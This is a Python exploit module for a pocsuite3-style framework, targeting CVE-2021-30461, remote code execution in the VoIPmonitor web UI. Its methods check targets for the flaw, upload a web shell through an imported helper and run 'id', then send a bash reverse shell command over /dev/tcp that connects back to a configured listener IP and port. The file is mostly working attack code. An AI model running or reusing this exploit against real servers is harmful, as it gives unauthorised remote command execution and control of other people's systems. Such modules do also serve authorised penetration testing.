"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse

from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str

import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
from configvalue import *
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2021_30461 import VoIPmonitor_RCE


class DemoPOC(POCBase):
    vulID = 'CVE-2021-30461'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '29/05/2021'
    createDate = '2021-09-15'
    updateDate = '2021-09-15'
    references = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30461']
    name = 'WebUI of VoIPmonitor remote code execution vulnerability '
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.PHP],
                "pocType" : "Software", 
                "folder_init": "cve_2021_30461"}
    appName = 'VoIPmonitor-cve-2021-30461'
    appVersion = 'CVE-2021-30461'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''A remote code execution issue was discovered in the web UI of VoIPmonitor before 24.61. When the recheck option is used, the user-supplied SPOOLDIR value (which might contain PHP code) is injected into config/configuration.php.'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}


    def _verify(self, update=True):
        if update: 
            config_input,Referer = decode_data_input_poc(self.headers['Referer'])
            try: 
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e: 
                raise Exception("Error " + self.appName + " :" + str(e))
        result = {}
        self.result_url = []
        for url in self.url: 
            try: 
                VoIPmonitor_RCE.set_tmp(url)
                result = VoIPmonitor_RCE.checkVulnerability(url)
                VoIPmonitor_RCE.set_tmp(url)
                if result: 
                    self.result_url.append(url)
            except Exception as e : 
                pass
        if len(self.result_url) > 0 : 
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.result_url
        if update: 
            return self.parse_output(result)
        else: 
            return result
       

    def _attack(self):
        config_input, Referer = decode_data_input_poc(self.headers['Referer'])
        try: 
            self.url = config_input["Input"]['RECON_WEBAPP']
        except Exception as e: 
            raise Exception("Error " + self.appName + " :" + str(e) )
        result = {}
        vul_url = []
        if len(self._verify(update=False)) > 0: 
            for url in self.url: 
                try: 
                    VoIPmonitor_RCE.set_tmp(url)
                    info = VoIPmonitor_RCE.uploadshell(url, "attack", "id")
                    VoIPmonitor_RCE.set_tmp(url)
                    if info: 
                        vul_url.append(url)
                except Exception as e: 
                    pass
            print(vul_url)
            if len(vul_url) > 0: 
                result['ShellInfo'] = {}
                result['ShellInfo']['url'] =  vul_url
                result['ShellInfo']['info'] = info
                return self.parse_output(result)
            else: 
                return self.parse_output(False)
        else: 
            return self.parse_output(False)

    def _shell(self):
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
                
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            command = "bash -i >&/dev/tcp/{0}/{1} 0>&1".format(lhost_running, lport_running)
            VoIPmonitor_RCE.shell(self.url,"shell", command)
            result['ShellInfo']["url"] = self.url
            result['ShellInfo']["info_reverse_shell"] = {
                "PublicIP": lhost_running,
                "PublicPort": lport_running

            }
            return self.parse_output(result)

        except Exception as e: 
            if type(e) == requests.exceptions.ReadTimeout: 
                return self.parse_output(result)
            print("Error run shell ", self.name, e)
            pass
        return self.parse_output(False)
        
                 
   

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
